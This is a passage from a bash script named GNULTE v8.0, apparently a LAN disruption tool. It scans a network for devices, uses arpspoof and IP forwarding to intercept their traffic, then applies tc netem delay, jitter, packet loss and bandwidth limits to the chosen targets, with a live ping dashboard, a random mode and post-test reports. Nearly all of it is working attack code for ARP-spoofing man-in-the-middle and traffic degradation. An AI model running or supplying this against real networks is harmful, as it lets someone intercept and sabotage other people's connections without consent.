    echo -e "${COLOR_DIM}Press ${COLOR_BOLD}Ctrl+C${COLOR_RESET}${COLOR_DIM} to stop${COLOR_RESET}"
    [ "$DURATION" -gt 0 ] && echo -e "${COLOR_DIM}Auto-stop in ${DURATION} seconds${COLOR_RESET}"
    [ "$RANDOM_MODE" = true ] && echo -e "${COLOR_WARN}Random mode active – parameters will vary${COLOR_RESET}"
    echo ""

    echo -e "  ${COLOR_BOLD}Targets:${COLOR_RESET} ${#TARGETS[@]} device(s)"
    echo -e "  ${COLOR_BOLD}Latency:${COLOR_RESET} ${LATENCY}ms  |  ${COLOR_BOLD}Jitter:${COLOR_RESET} ${JITTER}ms  |  ${COLOR_BOLD}Loss:${COLOR_RESET} ${LOSS}%"
    [ "$BANDWIDTH" -gt 0 ] && echo -e "  ${COLOR_BOLD}Bandwidth:${COLOR_RESET} ${BANDWIDTH} kbps"
    [ "$DURATION" -gt 0 ] && echo -e "  ${COLOR_BOLD}Duration:${COLOR_RESET} ${DURATION}s"
    echo -e "  ${COLOR_DIM}A post-test report (txt + html graphs) is generated on exit.${COLOR_RESET}"
    echo ""

    # Multi-target: also spawn a terminal per target (optional eye-candy)
    if [ ${#TARGETS[@]} -gt 1 ]; then
        log_info "Multiple targets detected – spawning ${#TARGETS[@]} monitor windows..."
        for IP in "${TARGETS[@]}"; do
            if spawn_monitor_terminal "$IP" "$LATENCY" "$JITTER" "$LOSS" "$BANDWIDTH"; then
                log_ok "Monitor window spawned for $IP"
            else
                log_warn "Could not spawn monitor for $IP – the dashboard will track it"
            fi
        done
        echo ""
        log_info "Live dashboard tracks all targets – Ctrl+C stops everything."
        echo ""
    fi

    # Initialise per-target statistics
    local i
    for i in "${!TARGETS[@]}"; do
        STAT_COUNT[$i]=0; STAT_TOTAL[$i]=0; STAT_MIN[$i]=0; STAT_MAX[$i]=0
        STAT_DROP[$i]=0; STAT_LAST[$i]=-1
    done
    SPARK_SAMPLES=()

    START_TIME=$(date +%s)
    REPORT_SAMPLE_DIR=$(mktemp -d /tmp/gnulte-samples.XXXXXX 2>/dev/null) || REPORT_SAMPLE_DIR=""
    if [ -n "$REPORT_SAMPLE_DIR" ]; then
        for i in "${!TARGETS[@]}"; do
            : > "$(report_fname "${TARGETS[$i]}")"
        done
    fi

    if [ -n "$EXPORT_CSV" ]; then
        echo "Timestamp,Target,Latency_ms,Status" > "$EXPORT_CSV"
    fi

    trap 'dash_clear; echo ""; log_warn "Stopping..."; cleanup; exit 0' INT TERM

    while true; do
        if [ "$DURATION" -gt 0 ]; then
            ELAPSED=$(($(date +%s) - START_TIME))
            if [ "$ELAPSED" -ge "$DURATION" ]; then
                dash_clear
                echo ""
                log_info "Duration limit reached (${DURATION}s). Stopping..."
                cleanup
                exit 0
            fi
        fi

        if [ "$RANDOM_MODE" = true ]; then
            RAND_LATENCY=$((LATENCY + RANDOM % 1000 - 500))
            [ "$RAND_LATENCY" -lt 100 ] && RAND_LATENCY=100
            RAND_JITTER=$((JITTER + RANDOM % 400 - 200))
            [ "$RAND_JITTER" -lt 50 ] && RAND_JITTER=50
            RAND_LOSS=$((RANDOM % 10))

            if [ "$BANDWIDTH" -gt 0 ]; then
                TC_CMD="tc qdisc change dev $INTERFACE parent 1:10 handle 10: netem"
            else
                TC_CMD="tc qdisc change dev $INTERFACE root netem"
            fi
            TC_CMD="$TC_CMD delay ${RAND_LATENCY}ms ${RAND_JITTER}ms"
            [ "$RAND_LOSS" -gt 0 ] && TC_CMD="$TC_CMD loss ${RAND_LOSS}%"
            sudo $TC_CMD 2>/dev/null
        fi

        dash_clear

        for i in "${!TARGETS[@]}"; do
            TARGET_IP="${TARGETS[$i]}"
            PING=$(ping -c 1 -W 1 "$TARGET_IP" 2>/dev/null | grep "time=" | awk -F'time=' '{print $2}' | cut -d' ' -f1)

            STAMP=$(date +%Y-%m-%d_%H:%M:%S)
            if [ -n "$PING" ]; then
                MS=$(printf "%.0f" "$PING")
                STAT_COUNT[$i]=$((STAT_COUNT[$i] + 1))
                STAT_TOTAL[$i]=$((STAT_TOTAL[$i] + MS))
                [ "${STAT_COUNT[$i]}" -eq 1 ] && STAT_MIN[$i]=$MS
                [ "$MS" -lt "${STAT_MIN[$i]}" ] && STAT_MIN[$i]=$MS
                [ "$MS" -gt "${STAT_MAX[$i]}" ] && STAT_MAX[$i]=$MS
                STAT_LAST[$i]=$MS

                if [ ${#TARGETS[@]} -eq 1 ]; then
                    SPARK_SAMPLES+=("$MS")
                    if [ ${#SPARK_SAMPLES[@]} -gt 60 ]; then
                        SPARK_SAMPLES=("${SPARK_SAMPLES[@]: -60}")
                    fi
                fi

                [ -n "$REPORT_SAMPLE_DIR" ] && echo "$MS" >> "$(report_fname "$TARGET_IP")"
                [ -n "$EXPORT_CSV" ] && echo "$STAMP,$TARGET_IP,$MS,OK" >> "$EXPORT_CSV"
            else
                STAT_DROP[$i]=$((STAT_DROP[$i] + 1))
                STAT_LAST[$i]=-1

                if [ ${#TARGETS[@]} -eq 1 ]; then
                    SPARK_SAMPLES+=("-1")
                    if [ ${#SPARK_SAMPLES[@]} -gt 60 ]; then
                        SPARK_SAMPLES=("${SPARK_SAMPLES[@]: -60}")
                    fi
                fi

                [ -n "$REPORT_SAMPLE_DIR" ] && echo "-1" >> "$(report_fname "$TARGET_IP")"
                [ -n "$EXPORT_CSV" ] && echo "$STAMP,$TARGET_IP,-1,DOWN" >> "$EXPORT_CSV"
            fi
        done

        if [ ${#TARGETS[@]} -eq 1 ]; then
            render_single_dashboard
        else
            render_multi_dashboard
        fi

        sleep 1
    done
}

# -----------------------------------------------------------------------------
# CLEANUP
# -----------------------------------------------------------------------------
cleanup() {
    echo ""
    log_info "Cleaning up..."

    # Kill monitor terminals
    for PID in "${TERMINAL_PIDS[@]}"; do
        kill "$PID" 2>/dev/null
    done

    log_cmd "tc qdisc del dev $INTERFACE root"
    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
    log_ok "Traffic control removed"

    for PID in "${SPOOF1_PIDS[@]}" "${SPOOF2_PIDS[@]}"; do
        sudo kill "$PID" 2>/dev/null
    done
    sudo killall arpspoof 2>/dev/null
    log_ok "ARP spoofing stopped"

    log_cmd "sysctl -w net.ipv4.ip_forward=0"
    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1
    log_ok "IP forwarding disabled"

    if [ -n "$EXPORT_CSV" ]; then
        log_ok "Results exported to: $EXPORT_CSV"
    fi

    generate_report

    echo ""
    log_ok "Cleanup complete. Target(s) restored."
}

# -----------------------------------------------------------------------------
# DEPENDENCY CHECK
# -----------------------------------------------------------------------------
check_deps() {
    local missing=()
    for cmd in arpspoof tc sysctl ping ip arp-scan; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        log_err "Missing dependencies: ${missing[*]}"
        echo ""
        echo "  Install with:"
        echo "    Debian/Ubuntu: sudo apt install dsniff iproute2 arp-scan"
        echo "    Arch:         sudo pacman -S dsniff iproute2 arp-scan"
        echo "    Fedora:       sudo dnf install dsniff iproute2 arp-scan"
        exit 1
    fi
}

# -----------------------------------------------------------------------------
# PARSE ARGUMENTS
# -----------------------------------------------------------------------------
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)      TARGET_INPUT="$2"; shift 2 ;;
        -m|--mac)         TARGET_MAC="$2"; shift 2 ;;
        -r|--range)       TARGET_RANGE="$2"; shift 2 ;;
        -w|--whitelist)   WHITELIST_INPUT="$2"; shift 2 ;;
        -l|--latency)     LATENCY="$2"; shift 2 ;;
        -j|--jitter)      JITTER="$2"; shift 2 ;;
        -p|--loss)        LOSS="$2"; shift 2 ;;
        -d|--duplicate)   DUPLICATE="$2"; shift 2 ;;
        -e|--reorder)     REORDER="$2"; shift 2 ;;
        -b|--bandwidth)   BANDWIDTH="$2"; shift 2 ;;
        --profile)        PROFILE="$2"; shift 2 ;;
        --duration)       DURATION="$2"; shift 2 ;;
        --random)         RANDOM_MODE=true; shift ;;
        --scan)           SCAN_MODE=true; shift ;;
        --quick)          QUICK_SCAN=true; shift ;;
        --force)          FORCE_MODE=true; shift ;;
        --save-profile)   SAVE_PROFILE="$2"; shift 2 ;;
        --export)         EXPORT_CSV="$2"; shift 2 ;;
        --log-mode)       LOG_MODE="$2"; shift 2 ;;
        --log-file)       SESSION_LOG="$2"; shift 2 ;;
        --verbosity)      case "$2" in easy|normal|expert) VERBOSITY="$2" ;; *) log_err "verbosity must be easy|normal|expert"; exit 1 ;; esac; shift 2 ;;
        --theme)          case " $THEME_NAMES " in *" $2 "*) THEME="$2"; apply_theme ;; *) log_err "unknown theme: $2 (options: $THEME_NAMES)"; exit 1 ;; esac; shift 2 ;;
        --settings)       settings_app; shift ;;
        --config)         edit_config; shift ;;
        --version)        echo "GNULTE v8.0"; exit 0 ;;
        -h|--help)        show_help; exit 0 ;;
        *)                log_err "Unknown option: $1"; show_help; exit 1 ;;
    esac
done

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
if [ -z "$LOG_MODE" ] || [ "$LOG_MODE" = "normal" ]; then
    LOG_MODE="${DEFAULT_LOG_MODE:-normal}"
fi
VERBOSITY="${VERBOSITY:-${DEFAULT_VERBOSITY:-normal}}"

show_header
show_boot
show_disclaimer
check_sudo
init_session_log
check_deps
detect_network

if [ "$SCAN_MODE" = true ] || [ "$QUICK_SCAN" = true ]; then
    if [ -n "$TARGET_INPUT" ]; then
        IFS=',' read -ra SCAN_TARGETS <<< "$TARGET_INPUT"
        for IP in "${SCAN_TARGETS[@]}"; do
            deep_scan "$IP"
        done
    else
        scan_devices
        display_devices
        echo "Select device to scan:"
        select_targets
        for IP in "${TARGETS[@]}"; do
            deep_scan "$IP"
        done
    fi
    exit 0
fi

if [ -n "$TARGET_RANGE" ]; then
    log_info "Scanning range: $TARGET_RANGE"

    if [ -n "$WHITELIST_INPUT" ]; then
        IFS=',' read -ra WHITELIST <<< "$WHITELIST_INPUT"
        log_info "Whitelist: ${WHITELIST[*]}"
    fi

    ( sudo nmap -sn "$TARGET_RANGE" 2>/dev/null > /tmp/gnulte_range.txt ) &
    range_pid=$!
    spinner "$range_pid" "Scanning range..."
    wait "$range_pid"

    RANGE_IPS=$(grep "Nmap scan report for" /tmp/gnulte_range.txt | awk '{print $NF}' | sed 's/[()]//g')
    rm -f /tmp/gnulte_range.txt

    for IP in $RANGE_IPS; do
        SKIP=false
        for W in "${WHITELIST[@]}"; do
            [[ "$IP" == "$W" ]] && SKIP=true && break
        done
        [ "$SKIP" = true ] && continue
        [[ "$IP" == "$MY_IP" ]] && continue
        TARGETS+=("$IP")
    done

    if [ ${#TARGETS[@]} -eq 0 ]; then
        log_err "No targets found in range (excluding whitelist/self)."
        exit 1
    fi
    log_target "Found ${#TARGETS[@]} targets in range"
    echo ""
fi

if [ -n "$TARGET_INPUT" ]; then
    IFS=',' read -ra TARGETS <<< "$TARGET_INPUT"
    log_target "Direct target(s): ${TARGETS[*]}"
    echo ""
fi

if [ -n "$TARGET_MAC" ]; then
    log_info "Resolving MAC: $TARGET_MAC"
    IP=$(arp -a | grep -i "$TARGET_MAC" | awk '{print $1}' | sed 's/[()]//g')
    if [ -n "$IP" ]; then
        TARGETS=("$IP")
        log_target "Resolved to IP: $IP"
    else
        log_err "Could not resolve MAC to IP. Is the device online?"
        exit 1
    fi
fi

if [ ${#TARGETS[@]} -eq 0 ]; then
    scan_devices
    display_devices
    select_targets
fi

if [ -n "$PROFILE" ]; then
    load_profile "$PROFILE" || exit 1
fi

LATENCY=${LATENCY:-$DEFAULT_LATENCY}
JITTER=${JITTER:-$DEFAULT_JITTER}
LOSS=${LOSS:-$DEFAULT_LOSS}
DUPLICATE=${DUPLICATE:-$DEFAULT_DUPLICATE}
REORDER=${REORDER:-$DEFAULT_REORDER}
BANDWIDTH=${BANDWIDTH:-$DEFAULT_BANDWIDTH}

if [ "$FORCE_MODE" = true ]; then
    estimate_impact "$LATENCY" "$JITTER" "$LOSS" "$DUPLICATE" "$REORDER" "$BANDWIDTH"
else
    configure_params
fi

if ! validate_params; then
    log_err "Configuration rejected. Aborting."
    exit 1
fi

if [ -n "$SAVE_PROFILE" ]; then
    save_profile "$SAVE_PROFILE"
fi

execute
monitor